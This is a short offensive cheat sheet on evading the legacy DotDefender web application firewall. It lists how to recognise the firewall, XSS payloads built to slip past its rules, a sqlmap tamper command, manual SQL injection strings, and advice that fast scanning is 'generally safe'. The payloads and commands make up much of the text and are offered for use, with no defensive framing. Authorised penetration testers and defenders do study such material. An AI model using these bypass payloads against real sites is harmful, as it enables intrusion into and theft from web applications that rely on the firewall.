# DotDefender (Applicure)

### Detection Signals
| Signal | Where |
|--------|-------|
| `X-dotDefender-denied` header | Response header on block |
| Block page: "dotDefender Blocked Your Request" | 403 response body |
| Block page: "Applicure dotDefender" | Response body reference |

### Bypass Strategy
- **Recommended tool**: curl/Burp. DotDefender has relatively simple regex rules.
- **Key weakness**: Pattern matching is basic — Unicode, double encoding, and comment injection bypass most rules.
- **Note**: Product is EOL/legacy. Rarely updated. Known bypasses work reliably.

### XSS Bypass
```
# DotDefender blocks: <script>, onerror, alert
# Easy bypasses (legacy rules):
<img/src=x onerror=alert(1)>
<svg/onload=alert`1`>
<details/open/ontoggle=confirm`1`>
<input autofocus onfocus=alert(1)>
```

### SQLi Bypass
```
sqlmap --tamper=between,space2comment -u URL

# Manual (usually simple):
' /*!UNION*/ /*!SELECT*/ 1,2,3--
' union%0aselect%0a1,2,3--
' OR 1=(SELECT 1)--
```

### Rate Limiting
- Minimal built-in rate limiting. Primarily signature-based.
- Fast scanning generally safe (10+ req/s).
- Block response: `X-dotDefender-denied` header.

---

